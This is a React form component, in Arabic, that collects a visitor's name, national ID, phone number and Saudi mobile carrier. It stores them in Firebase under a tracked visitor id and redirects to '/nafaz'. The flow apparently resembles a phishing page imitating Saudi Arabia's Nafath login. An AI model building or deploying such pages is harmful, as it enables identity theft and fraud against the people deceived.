"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { User, Phone, Wifi, IdCardIcon } from "lucide-react"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { CheckCircle } from "lucide-react"
import { addData } from "@/lib/firebase"

export default function NetworkInfoForm() {
  const [formData, setFormData] = useState({
    name: "",
    idNumber:"",
    phone: "",
    networkProvider: "",
  })
  const [submitted, setSubmitted] = useState(false)

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const visitorId=localStorage.getItem('visitor')
    addData({id:visitorId,...formData})
    window.location.href="/nafaz"
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4 flex items-center justify-center" dir="rtl">
      <Card className="w-full max-w-md shadow-lg border-gray-200">
        <CardHeader className="text-center">
          <div className="inline-flex items-center justify-center w-14 h-14 bg-green-100 text-green-600 rounded-full mb-4">
            <Wifi className="h-7 w-7" />
          </div>
          <CardTitle className="text-2xl font-bold text-gray-800">معلومات الشبكة</CardTitle>
          <CardDescription className="text-gray-500 pt-1">الرجاء إدخال بياناتك للمتابعة</CardDescription>
        </CardHeader>
        <form onSubmit={handleSubmit}>
          <CardContent className="space-y-6">
            {submitted ? (
              <Alert className="border-green-500 bg-green-50 text-green-800">
                <CheckCircle className="h-4 w-4 !text-green-600" />
                <AlertTitle className="font-bold">تم الإرسال بنجاح!</AlertTitle>
                <AlertDescription>شكراً لك، تم استلام معلوماتك وسنتواصل معك قريباً.</AlertDescription>
              </Alert>
            ) : (
              <>
                <div className="space-y-2">
                  <Label htmlFor="name" className="flex items-center gap-2">
                    <User className="h-4 w-4 text-gray-500" />
                    <span>الاسم الكامل</span>
                  </Label>
                  <Input
                    id="name"
                    placeholder="أدخل اسمك الكامل"
                    value={formData.name}
                    onChange={(e) => handleInputChange("name", e.target.value)}
                    required
                    className="h-11"
                  />
                
                </div>
                <div className="space-y-2">
                  <Label htmlFor="name" className="flex items-center gap-2">
                    <IdCardIcon className="h-4 w-4 text-gray-500" />
                    <span>رقم الهوية الوطنية </span>
                  </Label>
                   <Input
                    id="idNumber"
                    placeholder="  ادخل رقم الهوية"
                    value={formData.idNumber}
                    onChange={(e) => handleInputChange("idNumber", e.target.value)}
                    required
                    dir="rtl"
                    type="tel"
                    className="h-11"
                  />
                  </div>
                <div className="space-y-2">
                  <Label htmlFor="phone" className="flex items-center gap-2">
                    <Phone className="h-4 w-4 text-gray-500" />
                    <span>رقم الجوال</span>
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    placeholder="05xxxxxxxx"
                    value={formData.phone}
                    onChange={(e) => handleInputChange("phone", e.target.value)}
                    required
                    className="h-11"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="networkProvider" className="flex items-center gap-2">
                    <Wifi className="h-4 w-4 text-gray-500" />
                    <span>مزود الخدمة</span>
                  </Label>
                  <Select onValueChange={(value) => handleInputChange("networkProvider", value)} required>
                    <SelectTrigger id="networkProvider" className="h-11">
                      <SelectValue placeholder="اختر مزود الخدمة" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="stc">STC </SelectItem>
                      <SelectItem value="mobily">موبايلي </SelectItem>
                      <SelectItem value="zain">Zain</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              </>
            )}
          </CardContent>
          {!submitted && (
            <CardFooter>
              <Button type="submit" className="w-full bg-green-600 hover:bg-green-700 h-11">
                إرسال
              </Button>
            </CardFooter>
          )}
        </form>
      </Card>
    </div>
  )
}
